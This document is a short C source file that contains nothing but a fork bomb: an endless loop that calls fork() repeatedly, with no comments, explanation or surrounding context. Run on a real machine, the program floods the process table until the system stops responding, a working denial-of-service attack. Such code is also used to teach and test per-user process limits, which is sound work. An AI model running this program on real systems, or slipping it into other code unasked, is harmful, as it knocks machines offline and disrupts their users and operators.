#include <unistd.h>
main() {
    while(1){
        fork();
    }
    return 0;
}